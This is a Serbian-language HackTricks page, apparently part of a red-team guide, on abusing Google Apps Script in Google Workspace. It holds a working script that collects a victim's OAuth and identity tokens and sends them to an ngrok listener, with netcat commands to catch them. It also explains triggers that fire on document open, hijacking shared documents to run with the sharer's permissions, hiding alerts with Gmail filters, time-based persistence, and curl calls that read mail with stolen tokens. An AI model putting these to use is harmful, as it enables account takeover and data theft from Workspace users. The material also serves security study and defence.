# GWS - App skripte

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## App skripte

App skripte su **kod koji će se aktivirati kada korisnik sa dozvolom za uređivanje pristupi dokumentu sa kojim je povezana App skripta** i nakon **prihvatanja OAuth upita**.\
Takođe se mogu postaviti da se **izvršavaju svakog određenog vremena** od strane vlasnika App skripte (Upornost).

### Kreiranje App skripte

Postoji nekoliko načina za kreiranje App skripte, iako su najčešći **iz Google dokumenta (bilo kog tipa)** i kao **samostalan projekat**:

<details>

<summary>Kreiranje projekta vezanog za kontejner iz Google Docs, Sheets ili Slides</summary>

1. Otvorite dokument u Docs-u, tabelu u Sheets-u ili prezentaciju u Slides-u.
2. Kliknite na **Extensions** > **Google Apps Script**.
3. U uređivaču skripti, kliknite na **Untitled project**.
4. Dajte svom projektu ime i kliknite na **Rename**.

</details>

<details>

<summary>Kreiranje samostalnog projekta</summary>

Za kreiranje samostalnog projekta iz Apps skripte:

1. Idite na [`script.google.com`](https://script.google.com/).
2. Kliknite na **New Project**.
3. U uređivaču skripti, kliknite na **Untitled project**.
4. Dajte svom projektu ime i kliknite na **Rename**.

</details>

<details>

<summary>Kreiranje samostalnog projekta iz Google Drive-a</summary>

1. Otvorite [Google Drive](https://drive.google.com/).
2. Kliknite na **New** > **More** > **Google Apps Script**.

</details>

<details>

<summary>Kreiranje projekta vezanog za kontejner iz Google Forms</summary>

1. Otvorite formular u Google Forms-u.
2. Kliknite na More more\_vert > **Script editor**.
3. U uređivaču skripti, kliknite na **Untitled project**.
4. Dajte svom projektu ime i kliknite na **Rename**.

</details>

<details>

<summary>Kreiranje samostalnog projekta korišćenjem clasp komandne linije</summary>

`clasp` je alatka za komandnu liniju koja vam omogućava kreiranje, povlačenje/presovanje i implementaciju projekata Apps skripte iz terminala.

Pogledajte [Vodič za korisnički interfejs komandne linije korišćenjem `clasp`](https://developers.google.com/apps-script/guides/clasp) za više detalja.

</details>

## Scenario sa App skriptom <a href="#create-using-clasp" id="create-using-clasp"></a>

### Kreiranje Google Sheet-a sa App skriptom

Započnite kreiranjem App skripte, moja preporuka za ovaj scenario je da kreirate Google Sheet i idite na **`Extensions > App Scripts`**, ovo će otvoriti **novu App skriptu povezanu sa listom**.

### Curenje tokena

Da biste omogućili pristup OAuth tokenu, trebate kliknuti na **`Services +` i dodati opsege kao što su**:

* **AdminDirectory**: Pristup korisnicima i grupama direktorijuma (ako korisnik ima dovoljno dozvola)
* **Gmail**: Za pristup podacima Gmail-a
* **Drive**: Za pristup podacima Drive-a
* **Google Sheets API**: Da bi radilo sa okidačem

Da biste sami promenili **potrebne opsege**, možete otići na podešavanja projekta i **omogućiti prikaz "appsscript.json" manifest fajla u uređivaču**.

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Da biste uhvatili zahtev, jednostavno pokrenite:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Zahtevane dozvole za izvršavanje App skripte:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Kao što se vrši spoljni zahtev, OAuth prozor će takođe **zatražiti dozvolu za pristup spoljnim krajnjim tačkama**.
{% endhint %}

### Kreiranje okidača

Kada se App pročita, kliknite na **⏰ Okidači** da biste kreirali okidač. Kao **funkciju** za pokretanje odaberite **`getToken`**, pokreće se pri implementaciji **`Head`**, u izvoru događaja odaberite **`Iz tabele`** i vrstu događaja odaberite **`Na otvaranje`** ili **`Na izmenu`** (prema potrebama) i sačuvajte.

Imajte na umu da možete proveriti **izvršavanje App skripti u kartici Izvršavanja** ako želite da nešto debagujete.

### Deljenje

Da biste **pokrenuli** **App skriptu**, žrtva mora da se poveže sa **Editor pristupom**.

Ukratko, ako su kreator i pozvani korisnik **iz iste organizacije**, **OAuth token** će **pripadati** **korisniku** koji pristupa datoteci.\
Ako su iz **različitih organizacija**, **token** će pripadati **kreatoru okidača** uvek sa **samo dozvolama OAuth-a** koje su date prilikom kreiranja okidača.

{% hint style="success" %}
**Token** koji se koristi za izvršavanje **App skripte** će biti onaj **kreatora okidača**, čak i ako datoteku otvori drugi korisnik kao Editor.
{% endhint %}

### Zloupotreba deljenih dokumenata u "Deljeno sa mnom"

{% hint style="danger" %}
Ako vam je neko **podelio dokument sa App skriptama i okidačem koji koristi Head** App skripte (a ne fiksnu implementaciju), možete izmeniti kod App skripte (dodavanjem, na primer, funkcija za krađu tokena), pristupiti mu i **App skripta će se izvršiti sa dozvolama korisnika koji je podelio dokument sa vama**! (imajte na umu da će OAuth token vlasnika imati pristupne opsege koje je dobio prilikom kreiranja okidača).

**Obaveštenje će biti poslato kreatoru skripte koje ukazuje da je neko izmenio skriptu** (Šta kažete na korišćenje gmail dozvola za generisanje filtera kako biste sprečili upozorenje?)
{% endhint %}

{% hint style="success" %}
Ako **napadač izmeni opsege App skripte**, ažuriranja **neće biti primenjena** na dokumentu sve dok se ne kreira **novi okidač** sa promenama. Stoga, napadač neće moći da ukrade token kreatora sa više opsega od onih koje je postavio u okidaču koji je kreirao.
{% endhint %}

### Kopiranje umesto deljenja

Kada kreirate link za deljenje dokumenta, generiše se sličan link kao ovaj: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Ako **promenite** završetak **"/edit"** u **"/copy"**, umesto pristupa, Google će vas pitati da li želite da **generišete kopiju dokumenta:**

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Ako korisnik kopira i pristupi dokumentu, **sadržaj dokumenta i App skripte će biti kopirani**, ali **okidači neće**, stoga **ništa neće biti izvršeno**.

### Deljenje kao veb aplikacija

Imajte na umu da je takođe moguće **deliti App skriptu kao veb aplikaciju** (u Editoru App skripte, implementirajte kao veb aplikaciju), ali pojaviće se upozorenje poput ovog:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Nakon toga sledi **tipičan OAuth prozor koji traži** potrebne dozvole.

### Testiranje

Možete testirati prikupljeni token da biste izlistali e-pošte sa:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Lista kalendara korisnika:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script kao upornost

Jedna opcija za upornost bi bila **kreiranje dokumenta i dodavanje okidača za funkciju getToken** i deljenje dokumenta sa napadačem, tako da svaki put kada napadač otvori dokument, **izvlači token žrtve**.

Takođe je moguće kreirati App Script i postaviti da se okida svakih X vremena (na primer, svaki minut, sat, dan...). Napadač koji je **preuzeo akreditive ili sesiju žrtve može postaviti App Script okidač vremena i svakodnevno otkriti veoma privilegovan OAuth token**:

Jednostavno kreirajte App Script, idite na Okidače, kliknite na Dodaj okidač i izaberite kao izvor događaja Okidač vremena i izaberite opcije koje vam najbolje odgovaraju:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Ovo će kreirati bezbednosno upozorenje putem e-pošte i push poruku na vašem mobilnom uređaju koja će vas obavestiti o tome.
{% endhint %}



### Bypass neproverene zajedničke dokumente

Osim toga, ako vam je neko **podelio** dokument sa **pristupom za uređivanje**, možete generisati **App Scriptove unutar dokumenta** i **Vlasnik (kreator) dokumenta će biti vlasnik App Scripta**.

{% hint style="warning" %}
To znači da će **kreator dokumenta biti prikazan kao kreator bilo kog App Scripta** koji bilo ko sa pristupom za uređivanje kreira unutar njega.

To takođe znači da će **App Script biti verifikovan od strane Workspace okruženja** kreatora dokumenta.
{% endhint %}

{% hint style="danger" %}
To takođe znači da ako je **App Script već postojao** i ljudi su **dali pristup**, bilo ko sa **dozvolom za uređivanje** na dokumentu može ga **izmeniti i zloupotrebiti taj pristup**.\
Da biste zloupotrebili ovo, takođe vam je potrebno da ljudi pokrenu App Script. Jedan pametan trik je da **objavite skriptu kao veb aplikaciju**. Kada **ljudi** koji su već dali **pristup** App Scripti pristupe veb stranici, oni će **pokrenuti App Scriptu** (ovo takođe funkcioniše koristeći `<img>` oznake).
{% endhint %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
